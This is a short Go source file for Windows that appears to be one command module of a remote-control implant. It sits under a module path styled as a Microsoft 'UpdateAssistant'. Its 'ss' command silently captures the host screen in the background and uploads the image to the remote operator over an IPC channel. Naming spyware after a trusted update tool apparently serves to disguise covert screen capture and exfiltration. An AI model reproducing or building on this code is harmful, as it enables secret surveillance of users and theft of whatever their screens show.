//go:build windows

package media

import (
	"fmt"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/files"
	"github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

var usage = []string{
	"ss — capture the host screen and send it back as an image",
}

func Run(c *ipc.Context) error {
	if c.ArgString() != "" {
		return c.Usage(usage)
	}
	go capture(c)
	return nil
}

func capture(c *ipc.Context) {
	buf := sysutil.Capture()
	if len(buf) == 0 {
		c.Reply("capture failed")
		return
	}
	name := fmt.Sprintf("ss-%d.png", time.Now().Unix())
	id, err := files.Upload(name, buf)
	if err != nil {
		c.Reply("upload failed: " + err.Error())
		return
	}
	c.ReplyFile([]string{id})
}
